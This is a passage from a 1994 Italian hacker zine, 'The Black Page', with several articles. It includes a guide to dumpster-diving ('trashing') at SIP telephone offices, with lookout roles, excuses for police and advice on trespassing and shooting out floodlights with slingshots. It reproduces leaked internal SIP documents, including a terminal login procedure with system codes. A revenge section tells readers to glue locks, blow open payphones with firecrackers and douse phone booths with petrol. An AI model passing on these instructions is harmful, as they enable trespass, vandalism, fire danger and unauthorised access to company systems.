per  imparare ai nuovi operatori delle operazioni importanti (ad esempio..  il 
tracciamento  di linea.. ecc.) a come funziona un telefono (schemi  e  cazzate 
simili)! In Aggiunta a quelle cose, si possono trovare anke elenchi  telefoni-
ci.  Nel prossimo paragrafo vedremo qualke suggerimento per eseguire quando  o 
mentre si esegue un trashing. Lo scarto puo' essere abbastanza fruttuoso e di-
vertente,  basta  ke venga  fatto con attenzione senza prendere  bicchieri  di 
caffe', merdate simili o addirittura essere arrestato!

[[ Nota della Redazione : Il testo e' stato pubblicato cosi' come ci e' perve-
nuto. Ice MC ci ha detto di averlo scritto durante una notte di insonnia tota-
le, in preda a strane visioni mistiche .. :) ]]

Primo Passo: COME LOCALIZZARE IL BERSAGLIO
------------------------------------------
Questo passo consiste nella scelta della posizione di dove far Trashing.
La posizione dove dovrai andare a far Trashing e' l'Ufficio di Scambio che  e' 
qui'  dove succede tutto. Il modo piu' facile per trovare l' U.S.  e'  cercare 
parecchie antenne giganti. (non e' difficile.. di solito stanno sopra i  tetti 
:-))
Spesso pero' in alcune citta', la spazzatura degli Uffici di Scambi non  viene 
gettato  sotto l'edificio, quindi e' piu'  complicato. Io consiglio di  andare 
alla sede centrale, dove stanno gli uffici per noleggiare telefoni,  disabili-
tare numeri... e a volte.. xche' no? .. Abbonarsi a Itapac :-)) 
Un altro posto per fare trashing e' l'Ufficio di Smistamento dati. Trovarlo e' 
molto semplice... questi hanno una sola porta centrale e nessuna finestra... o 
una  sola  porta e qualke finestra con 3000 sbarre (da non confondere  con  il 
carcere).

[[  NdR : In poche parole, i luoghi migliori sono : La centrale che si  occupa 
dello  smistamento delle chiamate dei Cellulari, cioe' il famoso PONTE  RADIO. 
Spesso nella stessa costruzione del Ponte Radio si trovano anche i Pad di Ita-
Kaz quindi e' bene se si "trova" della spazzatura proveniente da li. In alter-
nativa c'e' sempre la Sede Centrale della Sip, dove cioe' vanno i clienti  per 
stipulare contratti, acquistare cellulari, telefoni, merdate, insomma, dove va 
la gente a Farsi Fottere i Soldi dal (Dis)Servizio di Stato. ]]

Secondo Passo: EQUIPAGGIAMENTO
------------------------------
Ecco una piccola lista dell'equipaggiamento che potresti prendere:

Auto : Porte aperte e luci spente
       L'auto non e' necessaria,  ma e' utile x  scappare veloce-
       mente ed e' molto meglio che camminare con 4 sacconi gi-
       ganti :-))

[[ NdR : Meglio non dare nell'occhio. Mai guardare direttamente eventuali per-
sone, se no ci si fa accorgere che e' in preparazione qualcosa. Scendete  dal-
l'auto, mettetevi a chiacchierare come se niente fosse, fumate una  sigaretta, 
finche'  le persone che possono vedervi mentre "agite" non se ne sono  andate. 
Ci  vuole soprattutto pazienza. Fingete di guardare spesso l'orologio come  se 
aveste un appuntamento ... Fate soprattutto attenzione non solo alla gente per 
la  strada  (dalle auto difficilmente si accorgono di cio' che fate)  ma  alla 
gente  sui balconi dei palazzi che ha un'ottima visuale !!! Inoltre  ricordate 
di posteggiare a circa 1 metro e mezzo dai cassonetti in modo da restare vici-
ni, fare prima e occultare di piu' la visuale. ]]

Persone: Piu' di uno .. ma meno di sei!
	 Non andare mai a far trashing da solo. E non portare mai
	 piu'  di cinque persone con te. Questo potrebbe dare  un 
	 po' nell'okkio.. vedere sei o sette persone con i sacchi
	 in  mano,  abbigliamento  scuro e torce  ...  potrebbero
	 pensare  a  una rapina :-)  Io raccomando di  andare  in
	 tre, ecco un piccolo schema:

  Numero di persone                : 1  2  3  4  5  6
  Persone per prendere i sacchi    : 1  1  2  3  3  4
  Persone  per osservare in giro   : 0  1  1  1  2  2
  --------- CONSIGLIATO ----------:        ^

[[  NdR : Personalmente pensiamo che possa creare svariati problemi essere  in 
piu' di 3 persone. Se dovete caricare 3 grossi sacchi su una Fiat Panda e sie-
te  in 4, non potrete usare i sedili posteriori. Spesso i sacchi sono piu'  di 
4 ... l'ideale e' essere in 2 persone. Cronometrando un'azione media si riesce 
a caricare tutto e ripartire, con molta calma e decisione, in circa 12  secon-
di. Certo, una Station Vagon come quella di Amadeus e' l'ideale :))))) ]]

Equipaggiamento: Secondo me non serve niente di speciale.. se poi
		 credete di essere rambo...date un'okkiata all'e-
		 quipaggiamento avanzato :-) .. Io credo che  ba-
		 sti semplicemente un abbigliamento Scuro (niente
		 abiti fluorescenti o cose spaziali :-))

EQUIPAGGIAMENTO AVANZATO:

	Maschera
	Guanti
	Walkie Talkies / CB
	Equipaggiamento  Diversivo: Fumo, Gas,  Bombe,  Bazzoka
	Se necessario porta anke qualke Mitra, Fucili, Pistole
	:-))

[[  Lunga nota della redazione : L'equipaggiamento. Questa e' una parte  molto 
pittoresca  scritta dal nostro Ice MC, ma e' verosimile che qualche  volta  si 
incappi  in qualche contrattempo. In molte centrali la spazzatura sta  ALL'IN-
TERNO  di recinti o di cortili delle costruzioni Sip. Quindi entrare  in  tali 
luoghi costituisce violazione di domicilio, e in ogni caso reato. In tali casi 
alcune persone molto intraprendenti hanno spesso usato sistemi piu'  avanzati. 
Immaginiamo uno scenario tipo, un cortile interno recintato, con grossi fari a 
luce gialla e telecamere. Uno si apposta alla macchina. " partono verso il mu-
retto.  Altri  2 armati di Fionda da tiro professionale (costa 50  mila  lire, 
molto accessibile a tutti) e pallini d'acciaio (gittata con tale fionda, circa 
200 metri o piu', potenza di penetrazione : IMPRESSIONANTE), colpiscono ALCUNI 
dei fari di illuminazione, cercando di creare un corridoio oscuro per raggiun-
gere la "spazzatura"). Creato il corridoio i 2 tipi in CALZAMAGLIA NERA e dal-
le  provate capacita' atletiche, si lanciano verso i cassonetti,  afferrano  i 
sacchi  (solitamente leggeri in quanto contengono rifiuti cartacei) ed  escono 
rapidamente.  Caricato tutto in macchina si riparte PIANO, A LUCI SPENTE,  per 
poi accelerare DOPO aver riacceso le luci a debita distanza.
Altro sistema : 2 persone vestite in modo molto trasandato, su un Ape Car  ca-
rico  con un po' di scatoloni di cartone e rottami metallici.  Basta  fingersi 
"barboni" o "robivecchi". Non ci saranno problemi a prendere dei sacchi.  Nes-
suno rompe i coglioni a chi cerca di farsi una pagnotta rivendendo cartoni  u-
sati !!!

Altro  metodo : PAGARE uno di questi barboni per fare il  sopracitato  lavoro. 
Con poche lire potrebbero convincersi a fare per voi il giro di ricerca, gior-
nalmente. 

p.s. In alcune centrali i rifiuti prima di uscire vengono TRITATI E  DISTRUTTI 
in appositi distruggi-documenti o inceneritori. 

Quindi aggiungiamo all'equipaggiamento avanzato :
-------------------------------------------------
Per azioni Commando-Style : Calzamaglia nera o abiti scuri e comodi come  tute 
da ginnastica, non indossare nessun oggetto luccicante. Annerire la faccia con 
un tappo di sughero bruciacchiato al fuoco. A portata di mano in macchina  te-
nete delle salviettine umidificate per ripulire il viso subito dopo l'azione.
Fionda  da tiro professionale con fermabraccio e pallini  di  ac-
ciaio da tiro o sferette in vetro.

Per  azioni  Barbon-Style : ApeCar, Vestiti trasandati, barba  lunga,  capelli 
sporchi, e meglio se si puzza come porci. 

Fine nota della Redazione ]]


Cosa Fare e Cosa NON Fare:
--------------------------
>Fatelo di notte.

>Dopo aver preso i sacchi fai l'ordinamento a casa o in qualsiasi altro  posto 
diversamente dal parkeggio dell'Ufficio.

[[ Traduzione : Cercate un posto tranquillo per esaminare i sacchi, un  garage 
con luce elettrica, una villetta di un amico, una seconda casa vuota, un posto 
lontano  da  occhi indiscreti e dove sia possibile esaminare  con  calma  ogni 
frammento cartaceo. ]]

>Non usare l'Equipaggiamento Diversivo a meno che non sia davvero necessario.

>Non ti cagare addosso quando lo fai.

[[ NdR : In caso di cagata addosso, abbandonare l'attivita' ]]

>Non chiudere nessuno del gruppo in un bidone ! :-)))

Parlando di Sicurezza/Polizia:
------------------------------
Allora.. parlando di sicurezza, non so quali siano i pericoli del trashing vi-
sto  che non sono mai stato preso :-) Comunque credo che non si  possa  rubare 
l'immondizia alle societa' telefoniche. Comunque, se vi capita di esser  presi 
(toccando balle) .. trovate qualke scusa del tipo... che il vostro pallone  e' 
andato a finire x caso dentro il bidone e lo state cercando.. oppure dite  che 
state  cercando taccuini per la scuola. Un modo per evitare di farsi  prendere 
e' fare il trashing di notte (tardi).

[[  NdR : Il problema legale e' una questione importante. Purtroppo  nella  ns 
sede non esiste alcun libro di legge, quindi per ora non possiamo controllare. 
Vero e' che dovrebbe essere vietato appropriarsi della spazzatura, in USA cio' 
costituisce violazione di domicilio. Ma ai barboni che scavano nei  cassonetti 
nessuno  va a rompere i coglioni. E COMUNQUE SPESSO i cassonetti sono  2  soli 
per  un quartiere intero, cio' significa che gran parte della roba  sta  FUORI 
DAL CASSONETTO e quindi trattasi di roba "trovata" :))
E vi assicuro che questo accade MOLTO SPESSO !!! ]]

Conclusione:
------------
Ke  dire?!?!.. non so nemmeno come ho fatto a scriverlo.. non kiedetemelo  co-
munque..  l'autore  si declina da ogni responsabilita'... se dopo  aver  fatto 
trashing.. usate ad esempio una bomba contro la societa'telefonica .. so' caz-
zi vostri!!! 
:-)))))

						  Ice MC


[[  NdR  : Che dire ? Ci associamo ad Ice MC, non sapendo come abbia  fatto  a 
scrivere  un testo del genere. Mah ! Comunque sia e' stato molto divertente  ! 
:)))) ]]


-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 7

==============================================================================

      --------------
    /----------------\          Benvenuti                                  
     |     N. U.    |                                 _____/\-----   
     |              |              all'               _____/\-----           
      \____________/                                  _____/\-----         
	o        o               ANGOLO               _____/\-----     
			      SIP - TELECOM                                

		Notizie fresche di cassonetto a cura di Ice MC 
==============================================================================

     Attenzione  : In alcuni casi i documenti da noi pubblicati  hanno  subito 
delle "censure", che si renderanno automaticamente evidenti nel contesto della 
lettura :). Cio' per evitare problemi sia a noi sia a chiunque possa  sentirsi 
in qualche modo "disturbato" dal contenuto di cio' che seguira'.

==============================================================================
	   Estratto da "Selezionando", Mensile aziendale della SIP
		       Anno XII numero 2, Febbraio 1992


				  Pagina 20

			    I COSTI DEL VANDALISMO
			    ======================


     Nel 1990 la Sip ha subito, per furti ed atti di vandalismo alle  apparec-
chiature  telefoniche, una perdita complessiva di circa 15 miliardi e 200  mi-
lioni. 
Lo  ha  evidenziato l'elaboratore dei dati pervenuti dalle DR in  una  ricerca 
della Protezione Aziendale.
Di questi, circa 14 miliardi e 500 milioni sono per "danni diretti" (furti  di 
gettoni,  danni ad apparecchi e cabine telefoniche) e 700 milioni  per  "danni 
indiretti" (mancati introiti). Si riscontra dunque rispetto al 1989 un  incre-
mento del 40% circa.
Pressoche' invariato rispetto all'anno precedente e' rimasto invece il  numero 
complessivo dei danneggiamenti (circa 109000) a dimostrazione di una  maggiore 
pesantezza dei singoli atti.


Distribuzione del fenomeno sul territorio
-----------------------------------------
Il fenomeno si e' manifestato quasi ovunque con perdite superiori al  miliardo 
di lire.

Cifre x 1000 :
3.300.000 nel Lazio (22% del totale, 2.000.000 nel 1989)
2.700.000 in Sicilia (18% del totale, 3.100.000 nel 1989)
1.700.000 in Campania/Basilicata (11% del totale, 
					 1.100.000 nel 1989)
1.400.000 in Emilia Romagna (10% del totale, 900.000 nel 1989)
1.300.000 in Toscana  (600.000 nel 1989)

Se si considera il danno globale medio per singolo evento (rapporto tra perdi-
ta  subita e numero eventi) il primato negativo spetta ad altre DR,  cioe'  ad 
Abruzzo-Molise (421000 ad evento), alla Liguria (276000 ad evento), al  Friuli 
v.g. (276000) ed a Piemonte-Val d'Aosta (240000), tutte al di sopra della  me-
dia nazionale (207000).

DANNI DIRETTI
-------------

I  danni maggiori sono sati quelli relativi agli apparecchi  telefonici  (com-
plessivamente 9.100.000.000) con un incidenza massima di 2.100.000.000 in  Si-
cilia, 1.300.000.000 in Campania, e 1 miliardo nel Lazio.
I furti di gettoni e monete hanno determinato un danno complessivo di circa  4 
miliardi e 100 milioni.

CAUSE E SOLUZIONI 
=================
Il  significativo  incremento  delle perdite complessive  subite  nel  settore 
dell'Azienda e' dovuto all'elevato numero di danni agli apparecchi Rotor  (520 
circa nel 1989, 2384 nel 1990) : si devono tuttavia tenere presenti sia  l'au-
mento della consistenza di tali apparecchiature, sia l'accresciuta "specializ-
zazione" degli autori di tali eventi criminosi.
Per limitare il piu' possibile i danni che comportano, oltre a perdite  econo-
miche  di notevole portata, un rilevante discapito all'immagine  dell'azienda, 
sono state intraprese da parte dei settori competenti varie iniziative.
Innanzitutto e' stata modificata la struttura dell'apparecchio  (rafforzamento 
della  piastra  frontale dello sportello-cassaforte, inserimento di  ganci  di 
chiusura  con perni di riscontro per lo sportello dell'apparecchio,  montaggio 
di 2 serrature di sicurezza); poi sono stati individuati, per i servizi di Ve-
rifica  dell'Efficienza della Protezione degli Impianti (VEPI), itinerari  che 
includano localita' ove sono ubicate apparecchiature piu' frequentemente  dan-
neggiate;  e'  inoltre  in corso una costante  sensibilizzazione  delle  forze 
dell'ordine (nel quadro dei rapporti sistematicamente intrattenuti) e dei  ge-
stori degli apparecchi.
Un'ultima soluzione : e' in corso uno studio diretto a valutare la  possibili-
ta' di dotare di allarme gli apparecchi telefonici piu' esposti.

Il tutto per "ANNIENTARE" il vandalismo, questa grave forma di disintroito per 
l'Azienda.

----------------------------------------------------------------------------

 17.8.94                                                           Legoland

 PROTOCOLLO :941700D54000612
 SIGLA FUNZIONE EMITTENTE : IS
 RIF.TO NS.                  :
 RIF.TO VS.            :
 DA                    : DR/SI
 A                       : DR/SI-M R RE L PRC
		      RSI PO    RSI A
			 OTBU/S2   OTTP/S2
		       FILIALI TUTTE
			   UTR TUTTE
		       UCTP TUTTE
		      AOR TUTTE
		       AREE DI VENDITA TUTTE
			   AREE ASSISTENZA TECNICA BUSINESS A2/a3

 Oggetto: Predisposizioni per l'avvio di TELECOM ITALIA S.p.a

 In relazione  alla nascita  di TELECOM  ITALIA vi informiamo che, a partire
 dal 18/08/94, il protocollo per tutta la corrispondenza dovra' essere unico,
 iniziando dal numero uno; tutta la corrispondenza esterna (carta intestata,
 ordinazioni, bolle  di accompagnamento  etc.) e  le relative buste dovranno
 riportare il nuovo logo, avendo cura di barrare il vecchio.
 Con plico  a parte  vi inviamo i timbri che dovranno essere usati in questa
 fase transitoria.
 Sara' nostra cura inviarvi, appena definita, la nuova carta intestata verso
 terzi.
 A disposizione  per gli  eventuali chiarimenti che si rendessero necessari,
 porgiamo cordiali saluti.

						     F. Molla

----------------------------------------------------------------------------
Da un ritaglio di carta : 


		PROCEDURA PER L'USO DEL TERMINALE
	       =================================

	ACCERTARE CHE L'INTERRUTTORE GENERALE SIA INSERITO.
	 "      "     "    "      DEL VIDEO SIA INSERITO.
    COMPORRE MEDIANTE LA TASTIERA LA SIGLA "CIC521MA" E
	     PIGIARE IL TASTO ENTER.
 COMPORRE MEDIANTE LA TASTIERA LA SIGLA "CIC5-V5" E
	      PIGIARE CONTEMPORANEAMENTE AL TASTO ALT IL
	      TASTO CLEAR.
    COMPORRE MEDIANTE LA TASTIERA LA SIGLA "SIAR" E PI=
	     GIARE IL TASTO ENTER.
   INSERIRE MEDIANTE LA TASTIERA IL NUMERO DI CODICE
	       DELL'OPERATORE E LA PAROLA CHIAVE QUINDI
		PIGIARE IL TASTO ENTER.
 N.B.  CON IL TASTO CLEAR SI RITORNA ALLA PAGINA
       PRECEDENTE E CON IL TASTO ENTER SI VA ALLA
	      PAGINA SUCCESSIVA.

	      IN CASO DI GUASTO TELEFONARE AI N. TELEFO=
	      NICO 5722122 , 5722169 E 5723287 DI TORINO
	      PREFISSO 011.

----------------------------------------------------------------------------

 SIP
 Linea Territoriale Personale Organizzazione
 Legoland



			 C O M U N I C A T O 

  Si informano  tutti i lavoratori interessati  che a  partire
 dal  18 giugno  e sino  al 07 settembre un notiziario quotidiano su
 tutti i soggiorni estivi potra' essere ascoltato formando il numero
 verde relativo ai soggiorni di seguito elencati:

 SOGGIORNO                                 Numero verde per
					notiziario giornaliero

 LIZZANO
 -------
    Soggiorno di vacanze "SIP"                    167/011115
    Villaggio Europa
    40042 - LIZZANO IN BELVEDERE (BO)
    tel. 0534/53033

 GRESSONEY
 ---------
    Soggiorno di vacanze SIP                  167/860012
    Frazione Cioarde
    11025 - GRESSONEY ST. JEAN (AO)
    tel. 0125/355431

 PRAGELATO
 ---------
    Soggiorno di vacanze "Casa Alpina"         167/010115
    "Don Barra" Frazione Soucheres Basses
    10060 - PRAGELATO (TO)
    tel. 0122/78250

 AURONZO
 -------
    Soggiorno di vacanze "Domenico Savio"       167/860001
    Localita' Cosderuoibe
    32041 - AURONZO dI CADORE (BL)
    tel. 0435/97311

 PIANI DI LUZZA 
 --------------
    Comunita' A
    Soggiorno di vacanze "Piani di Luzza" 167/861043
    33020 - FORNI AVOLTRI (UD)
    tel. 0433/72366 - 72348

    Comunita' B
    Soggiorno di vacanze "Piani di Luzza"     167/861043
    33020 - FORNI AVOLTRI (UD)
    tel. 0433/72339 - 72334


[N.d.R.  Belle  eh ? Le vacanze SIP sovvenzionate dal sangue che  versiamo  in 
bollette telefoniche ... anche il Numero verde, hanno ... #|( ]

----------------------------------------------------------------------------
E per finire .... la chicca ... 


	 A Grande richiesta.. 

			      LA SIP PARADE !!!
	     
				Trascritta da
	       
				    ICE MC
	 
			  A cura degli OPERATORI SIP


   CornFlakes girl - Tori amos
     Se tu non torni - miguel bose'
  I believe
       Now and forever
 Sleeping in a car - roxette
     Right in The night - jam & spoon
	move on baby - cappella
 Thing about the way - ice mc
    Ho voglia d'innamorarmi - baccini
       Mm Mm Mm Mm - Crash Test Dummies
	Quando tramonta il sole - vernice
       Io muoio per te - Tozzi
 Gente - L. Pausini


[N.d.R    : Questa e' la lista  completa  della Hit Parade SIP.. 
	 ricopiata in ogni singola lettera dal foglio trovato
	    ..hahhaha... notare l'accuratezza usata nella lingua
	    inglese :-)))            Ice MC ]


----------------------------------------------------------------------------

-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 8



				 ===========
				 MARIA JUANA
				 ===========


LA CANAPA INDIANA, CHE SOLLIEVO

Dal Manifesto del 11 agosto 1994 - di A.P.

La notizia e' arrivata un paio di giorni fa dalla Gran Bretagna: il  ministero 
della  sanita' inglese starebbe esaminando la possibilita' di  autorizzare  la 
somministrazione della cannabis (cioe' di hashish e marijuana) sotto controllo 
medico.  Cioe' il Paese e' a un passo dall'equipararla ai farmaci  e  sommini-
strarla in ospedale e, forse addirittura, consentirne la vendita nelle  farma-
cie, naturalmente dietro prescrizione medica. 
Il suo uso, affermano gli scienziati inglesi, sarebbe assai utile nelle  tera-
pie del dolore per i malati terminali. Come e' noto, gia' la morfina viene am-
piamente utilizzata a tale scopo perche' ha capacita' analgesiche, ma la  can-
nabis,  che in tutto il mondo viene assimilata alle droghe e percio'  vietata, 
non ha mai neppure potuto godere del riconoscimento della efficacia terapeuti-
ca ed e' percio' esclusa dalla farmacopea ufficiale.
Ma nel rapporto danno-beneficio, quale posto spetta alla cannabis e quale alle 
comuni medicine? Un occhio di attenzione agli interessi delle industrie farma-
ceutiche non guasterebbe. Anche perche', come dimostrano numerosi studi e  pa-
reri  scientifici, gli effetti della cannabis si estendono ben al di  la'  del 
solo uso antidolore.
Ci riferiamo, in particolare, ad un recente studio di due ricercatori inglesi, 
Grinspoon  e Bakalar ("Marijuana: the forbidden medicine", Yale  Univ.  Press, 
New  Haven, London, 1993) che hanno effettuato un'ampia e aggiornata  ricogni-
zione su tutti i possibili usi terapeutici della cannabis (ne ha scritto,  sul 
manifestomese  del gennaio 1994 dal titolo "Farmotraffico",  Giancarlo  Arnao) 
pur non potendo compiere ricerche organiche, come avviene nel casi dei  farma-
ci, a causa della illegalita' della sostanza.

La cura delle malattie
I  due ricercatori inglesi hanno individuato almeno otto  differenti  impieghi 
della sostanza: nei casi di glaucoma. E' necessario ricordare il caso  dell'a-
mericano  Randall, affetto da glaucoma, il quale dopo una lunga battaglia,  e' 
riuscito ad ottenere "legalmente" per alcuni mesi per se' e per altri otto am-
malati  di  glaucoma, cancro, sclerosi multipla, dolori cronici  e  Aids,  una 
quantita' di marijuana pari a trecento sigarette al mese. Nei casi di  glauco-
ma, infatti, scrivono Grinspoon e Bakalar, la cannabis ha dimostrato di  poter 
sostituire con maggior efficacia, altri farmaci che implicavano pesanti effet-
ti collaterali. 
Altro impiego che ha dato buoni risultati, quello nel combattere l'inappetenza 
in  chi e' sottoposto a chemioterapia. Nei casi di epilessia, sono  stati  ri-
scontrati  effetti  benefici e puo' sostituire i farmaci  anticonvulsivi  (che 
provocano molti effetti collaterali) e cosi' anche nella sclerosi multipla  in 
sostituzione dei farmaci tranquillanti in alte dosi. La marijuana e' stata ef-
ficacemente sperimentata anche nella paraplegia e quadriplegia in sostituzione 
di  oppioidi  o tranquillanti.
Infine, con risultati positivi riscontrati in qualche caso, gli effetti  bene-
fici della cannabis si sono visti nei cadi di dolori cronici e di cefalee come 
anche nelle depressioni, in sostituzione dei farmaci antidepressivi.
Nonostante  questa ampia letteratura, e nonostante la stessa Dea  (la  polizia 
antidroga  statunitense) abbia dovuto ammettere che "la cannabis e' una  delle 
sostanze  farmacologicamente piu' sicure", il governo Usa ha rifiutato di  in-
cludere hashish e marijuana nella categoria dei farmaci liberamente prescrivi-
bili dai medici privati.

Per i malati di Aids
La questione dell'uso terapeutico della cannabis e' diventata cruciale con  la 
diffusione dell'Aids che viene curato con farmaci chemioterapici.  L'obiezione 
piu'  frequesnte all'uso terapeutico della cannabis riguarda la  sua  presunta 
capacita'  di produrre assuefazione. Numerosissimi studi hanno dimostrato  che 
la sostanza non produce assuefazione, e, per converso, i farmaci che  andrebbe 
a sostituire sono in genere assai tossici: nel caso delle epilessie, ad  esem-
pio,  gli anti-convulsivanti possono provocare anemie, disturbi emotivi e  ri-
schi  di overdose mortali; per la sclerosi multipla alti dosaggi di  tranquil-
lanti  provocano letargie e dipendenza; nella paraplegia, che  viene  "curata" 
con oppiacei, i risci di dipendenza dalla sostanza sono svidenti; gli  antide-
pressivi  possono provocare insonnia, impotenza, nausea, danni al cuore  e  ai 
reni. Infine, da recenti studi sembra che il tetraidrocannabinolo (la sostanza 
contenuta nella cannabis) sia gia' presente naturalmente nel corpo umano, piu' 
esattamente nella milza.

Quella  imboccata  dal governo inglese sembra una strada destinata  ad  essere 
percorsa  da molti, non solo nei paesi piu' tolleranti e "liberali"  nei  con-
fronti  dell'uso della cannabis, come l'Olanda. In Italia la legge  Jervolino-
Vassalli  consente l'uso terapeutico delle sostanze  stupefacenti  intenndendo 
con  cio' quelle contenute nella farmacopea ufficiale. Percio'  assistiamo  al 
paradosso  che gli oppiacei possono essere usati (come si sa producono  dipen-
denza) mentre i derivati dalla cannabis, che non producono dipendenza, ne' al-
tri effetti collaterali, sono rigorosamente vietati. 


[N.d.R. Governo Bastaaaaardoooooooooo !!! ]

-----------------------------------------------------------------------------

-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 9

				ARMI E BAGAGLI

				    Cioe'

			      ANARCHIA SPICCIOLA
			       PER FARE CASINO
				      by 
			      Dupree's Paradise
			-----------------------------

     Innanzitutto  una premessa : Le informazioni che seguono sono  facilmente 
reperibili su pubblicazioni gia' esistenti in librerie o edicole, come la rac-
colta  "Commando",  o il "Manuale del terrorista". Quindi, se  tale  materiale 
viene tranquillamente pubblicato su libri o riviste, perche' non scriverlo  in 
un file e renderlo pubblico ? NON E' VIETATO ! :)

PARTE 1 - Vendette.
===================

     Alcune volte i casi della vita sono strani. Ogni tanto qualcuno ci fa ve-
ramente del male, e scatta in noi il desiderio di rivincita che e' insito  nel 
nostro  orgoglio personale. Ora, o reprimiamo questo nostro desiderio,  scate-
nando pero' delle frustrazioni che ci porteranno ad essere nervosi ed  irrita-
ti, opure ci LIBERIAMO di questi veleni anziche' accumularli. 

     Liberarsi  vuol dire quindi AGIRE per dar sfogo (controllato)  al  nostro 
istinto che vuole prendersi la rivincita. 

     Possiamo quindi immaginare che una persona "A" che ha subito molto,  MOL-
TO,  da un'altra persona "B", desideri "vendicarsi" della persona "B" in  modo 
da  prendersi una rivincita morale e sentirsi quindi meglio,  piu'  sollevato, 
felice, in pace con se', sicuro di aver fatto la cosa giusta. 

     Proviamo ad immaginare alcuni scenari.
     -------------------------------------- 

1> Impiegato licenziato dal datore di lavoro
--------------------------------------------
     L'impiegato in questione odia a morte i datori di lavoro. Questo impiega-
to "A" lavorava in una sede chiusa da porte blindate e vetri anch'essi blinda-
ti.  Il tutto con una serratura particolare, blindata, incassata  nella  porta 
blindata, insomma cazzo, tutto blindato, ok ?
     L'impiegato  acquista diversi prodotti. Qui lo scenario si fa  variabile. 
Acquista  ad esempio della resina epossidica in tubettu, del  Silicone,  della 
resina termoindurente speciale ad uso industriale, o del semplice Attack.
     E'  facile, nottetempo, far COLARE l'intero contenuto del tubetto  dentro 
l'UNICA  serratura di accesso della sede. Idem dicasi per le porte della  mac-
china del datore di lavoro che cosi' non potra' infilare le chiavi. E'  fonda-
mentale scegliere una resina che sia difficile da sciogliere con solventi  ... 
e se possibile resistente al fuoco.

2) Persona frustrata dal sistema.
---------------------------------
     Capita a volte che qualcuno si senta oppresso da tutta una serie di cose. 
Ad  esempio puo' capitare di sentirsi repressi a causa dell'esosita'  e  delle 
ladronerie  delle  compagnie telefoniche (nel ns caso, una : la  SIP).  Quindi 
possiamo immaginare una persona che cerchi di sfogare queste sue  frustrazioni 
tramite deplorevoli atti di vandalismo, cercando pero' delle soddisfazioni nel 
modo con cui questi atti vengono fatti. La persona in questione potrebbe quin-
di prendere di mira le cabine telefoniche. Proviamo ad immaginarci come !

     Esempio 1) La persona infila un "raudo" o "minerva" acceso nello sportel-
lino della restituzione monete della cabina. Il raudo esplode facendo  saltare 
lo sportellino trasparente del vano di restituzione monete.

     Esempio 2) Il tipo inkazzato cola resina epossidica o silicone nelle fes-
sure di inserimento delle monete. Di fatto questa azione blocca le cabine !!!

     Esempio 3) Il tale cosparge la cabina del telefono e il lettore di schede 
di BENZINA. La benzina ha un alto potere esplosivo, e noi abbiamo avuto  noti-
zie  di gravi incidenti occorsi a vandali che abbiano agito in  modo  incauto. 
Nella maggior parte dei casi l'esplosione pare abbia fatto saltare il  fronta-
lino metallico dei lettori di schede. (Fonti Anonime, giornali locali)

     Esempio 4) Il tipo si organizza con fionda e pallini di acciaio,  andando 
a centrare i vetri delle centrali Sip e delle sedi. Spesso esistono ampi  por-
toni in cristallo. Un vandalo ci ha confessato di aver frantumato uno di  que-
sto portoni in cristallo con un colpo di fionda. La maniglia del portone  dap-
prima e' rimasta a mezz'aria e poi e' caduta per terra.  Anche le cabine della 
Sip pare siano state spesso prese di mira da vandali. Risulta cio' da uno stu-
dio  sociologico effettuato dalla Sip e pubblicato sulla loro rivista  interna 
"Selezionando" di qualche mese fa, in cui risulta che le cause di questi  atti 
di vandalismo sono spesso da ricercare nella decadenza dei valori della socie-
ta' attuale che pare non offrire vie di sfogo ai giovani. Che peccato non aver 
trovato  l'articolo !! In compenso avete letto quello relativo alle stime  dei 
danni ... :)

						       Dupree's Paradise



-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 10

Quanto segue e' stato scritto nel gennaio 1994 (quindi *ben prima* 
dell'italian crackdown). Concepito per essere pubblicato su DECODER #9, e' 
rimasto poi inedito.

Note:

1. il pubblico previsto per questo pezzo era quello classico di una rivista 
come DECODER, i cui lettori sono gia' svezzati per quanto riguarda i temi 
generali ma non padroneggiano necessariamente lo slang telematico.

2. alla luce delle proposte uscite anche in Italia in seguito al crackdown 
di maggio 1994, vorrei sottolineare a scanso di equivoci che gli 
apprezzamenti rivolti all'EFF e a quella che nelle conclusioni ho chiamato 
"Libera Repubblica del Ciberspazio" sono evidentemente ironici.

******************************************************************
   
   1. La democrazia elettronica e il suo business
   ==============================================
 
   Le  comunit  in  rete,  le net-communities,  costituiscono  il
risultato piu' interessante, dal punto di vista sociologico,  della
progressiva opera di cablaggio e interconnessione del  globo.  Per
chi   le  vuole  intendere  cosi',  costituiscono  degli  splendidi
fenomeni  da  baraccone  strettamente imparentati  con  la  realta'
virtuale e piu' in generale con l'intero universo cyberpunk: coppie
che  si  conoscono  e si sposano online, telenovelas  sentimentali
vissute  in  prima  persona,  amplessi  condotti  a  distanza  con
l'ausilio di apposite periferiche, rapporti d'affari, liti,  tutto
questo  e  altro ancora diventa il circo-Spettacolo della  societa'
post-moderna, fagocitato dai media e dal loro pubblico.
   
   Comunita',  identita',  appartenenza. Luogo,  patria,  cittadino,
straniero.  Tutto si ripete e tutto muta una volta  fatto  il  suo
ingresso  nella  Matrice.  Chaos. Disorientamento.  Panico.  Nuovi
steccati  con cui marcare i limiti della Frontiera,  in  modo  che
tutti  possano  vedere  dove finisce il mondo  e  fino  a  dove e' 
ragionevole  spingersi.  Proliferano  gli  studi  sulle   comunita'
virtuali e sulla fenomenologia delle relazioni sociali sulle  reti
telematiche,  compaiono improvvisamente gli esperti  che  spiegano
cosa sta accadendo e gli indigeni da intervistare - *ehi, com' e'
la vita laggiu' ?
   
   Il  ciberspazio  e  le  comunita' che lo  abitano  esistono  dal
Principio  dei  Tempi,  ma  solo  da  poco e' iniziata  la   loro
colonizzazione. I Pionieri hanno iniziato a muoversi  per  portare
la loro civilta' ai Selvaggi. Diritti. Leggi. Ordine.
   
   Howard  Rheingold annuncia che si e' definitivamente avviato  il
cammino verso la democrazia elettronica, ed in effetti la campagna
presidenziale statunitense 1992 di Bill Clinton ha avuto un occhio
di   particolare  riguardo  verso  gli  utilizzatori  delle   reti
telematiche - si dice sia stata un'idea del suo vice Al  Gore,  un
passato  lavorativo nel campo ed una conoscenza  non  superficiale
delle  dinamiche di rete. Clinton ha vinto ed uno dei punti  fermi
della  sua amministrazione rimane la costruzione delle Information
Superhighways,    le    autostrade   della   trasmissione    dati.
